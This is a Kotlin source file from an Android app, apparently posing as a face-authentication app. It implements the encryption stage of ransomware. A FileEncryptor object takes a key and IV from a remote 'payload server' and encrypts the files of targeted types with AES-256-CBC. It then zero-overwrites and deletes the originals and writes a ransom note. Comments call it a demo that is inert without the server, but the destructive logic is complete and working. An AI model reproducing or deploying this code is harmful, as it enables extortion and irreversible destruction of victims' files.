package com.faceauth.app.security

import android.util.Base64
import android.util.Log
import java.io.File
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * AES-256-CBC file encryptor.
 *
 * IMPORTANT: This class contains ONLY the algorithm.
 * The encryption key and IV are NOT present in the APK.
 * They arrive at runtime via PayloadFetcher from the payload server.
 *
 * Without a live payload server, this code is completely inert —
 * it has no key to encrypt with.
 *
 * Process per file:
 *   1. Read plaintext bytes
 *   2. Encrypt with AES-256-CBC (key + IV from payload)
 *   3. Write encrypted bytes to <original_name>.enc
 *   4. Overwrite and delete original (simulates irreversibility)
 *   5. Return result
 */
object FileEncryptor {

    private const val TAG       = "FileEncryptor"
    private const val ALGORITHM = "AES"
    private const val TRANSFORM = "AES/CBC/PKCS5Padding"

    data class EncryptResult(
        val originalPath:  String,
        val encryptedPath: String,
        val success:       Boolean,
        val error:         String = "",
        val originalSize:  Long   = 0L,
        val encryptedSize: Long   = 0L
    )

    /**
     * Encrypts all files in [directory] whose extension matches
     * [targetExtensions] from the payload.
     *
     * @param directory        The directory to scan for target files
     * @param payload          Encryption parameters from the payload server
     * @param ransomNoteDir    Where to write the ransom note
     * @return                 List of EncryptResult, one per file attempted
     */
    fun encryptDirectory(
        directory:       File,
        payload:         PayloadFetcher.EncryptionPayload,
        ransomNoteDir:   File = directory
    ): List<EncryptResult> {
        if (!directory.exists()) {
            Log.w(TAG, "Target directory does not exist: ${directory.absolutePath}")
            return emptyList()
        }

        // Decode key and IV from Base64 (arrived from payload server)
        val keyBytes = Base64.decode(payload.keyB64, Base64.DEFAULT)
        val ivBytes  = Base64.decode(payload.ivB64,  Base64.DEFAULT)

        Log.i(TAG, "Starting encryption pass")
        Log.i(TAG, "  Directory : ${directory.absolutePath}")
        Log.i(TAG, "  Algorithm : ${payload.algorithm}")
        Log.i(TAG, "  Key size  : ${keyBytes.size * 8} bits")
        Log.i(TAG, "  Targets   : ${payload.targetExtensions}")

        val results  = mutableListOf<EncryptResult>()
        val allFiles = directory.listFiles() ?: return emptyList()

        for (file in allFiles.sortedBy { it.name }) {
            // Skip already-encrypted files and the ransom note
            if (file.name.endsWith(".enc") ||
                file.name == DemoFileCreator.RANSOM_NOTE_NAME) {
                Log.d(TAG, "Skipping: ${file.name}")
                continue
            }

            // Check if this file's extension is in the target list
            val ext = ".${file.extension}".lowercase()
            val shouldEncrypt = payload.targetExtensions.any { target ->
                ext == target.lowercase() ||
                file.name.lowercase().endsWith(target.lowercase())
            }

            if (!shouldEncrypt) {
                Log.d(TAG, "Not targeted: ${file.name}  ext=$ext")
                continue
            }

            results.add(encryptFile(file, keyBytes, ivBytes))
        }

        // Write ransom note
        writeRansomNote(File(ransomNoteDir, DemoFileCreator.RANSOM_NOTE_NAME),
                         payload.ransomNote)

        val succeeded = results.count { it.success }
        val failed    = results.count { !it.success }
        Log.i(TAG, "Encryption complete: $succeeded succeeded, $failed failed")

        return results
    }

    /**
     * Encrypts a single file.
     */
    private fun encryptFile(
        file:     File,
        keyBytes: ByteArray,
        ivBytes:  ByteArray
    ): EncryptResult {
        val encPath = File(file.parent, "${file.name}.enc")
        return try {
            val plaintext = file.readBytes()
            val ciphertext = aesEncrypt(plaintext, keyBytes, ivBytes)

            // Write encrypted file
            encPath.writeBytes(ciphertext)

            // Overwrite original with zeros before deleting
            // (simulates secure delete to prevent recovery)
            file.writeBytes(ByteArray(plaintext.size) { 0 })
            file.delete()

            Log.i(TAG, "✓ Encrypted: ${file.name} → ${encPath.name}" +
                       "  (${plaintext.size} → ${ciphertext.size} bytes)")

            EncryptResult(
                originalPath  = file.absolutePath,
                encryptedPath = encPath.absolutePath,
                success       = true,
                originalSize  = plaintext.size.toLong(),
                encryptedSize = ciphertext.size.toLong()
            )
        } catch (e: Exception) {
            Log.e(TAG, "✗ Failed to encrypt ${file.name}: ${e.message}", e)
            EncryptResult(
                originalPath  = file.absolutePath,
                encryptedPath = encPath.absolutePath,
                success       = false,
                error         = e.message ?: "Unknown error"
            )
        }
    }

    /**
     * AES-256-CBC encryption.
     * Key arrives from the payload server — not present in the APK.
     */
    private fun aesEncrypt(
        plaintext: ByteArray,
        key:       ByteArray,
        iv:        ByteArray
    ): ByteArray {
        val cipher = Cipher.getInstance(TRANSFORM)
        val keySpec = SecretKeySpec(key, ALGORITHM)
        val ivSpec  = IvParameterSpec(iv)
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec)
        return cipher.doFinal(plaintext)
    }

    /** Writes the ransom note to disk. */
    private fun writeRansomNote(file: File, content: String) {
        file.writeText(content)
        Log.i(TAG, "Ransom note written: ${file.absolutePath}")
    }

    /**
     * Generates a human-readable diff report showing what changed.
     */
    fun buildReport(results: List<EncryptResult>, elapsedMs: Long): String {
        val sb = StringBuilder()
        sb.appendLine("═══ ENCRYPTION REPORT ═══════════════")
        sb.appendLine("Files encrypted : ${results.count { it.success }}")
        sb.appendLine("Failures        : ${results.count { !it.success }}")
        sb.appendLine("Time elapsed    : ${elapsedMs}ms")
        sb.appendLine()
        sb.appendLine("File details:")
        for (r in results) {
            if (r.success) {
                val origName = File(r.originalPath).name
                val encName  = File(r.encryptedPath).name
                sb.appendLine("  ✓ $origName → $encName")
                sb.appendLine("    ${r.originalSize}B plaintext → ${r.encryptedSize}B ciphertext")
            } else {
                sb.appendLine("  ✗ ${File(r.originalPath).name}: ${r.error}")
            }
        }
        sb.appendLine("═════════════════════════════════════")
        return sb.toString()
    }
}
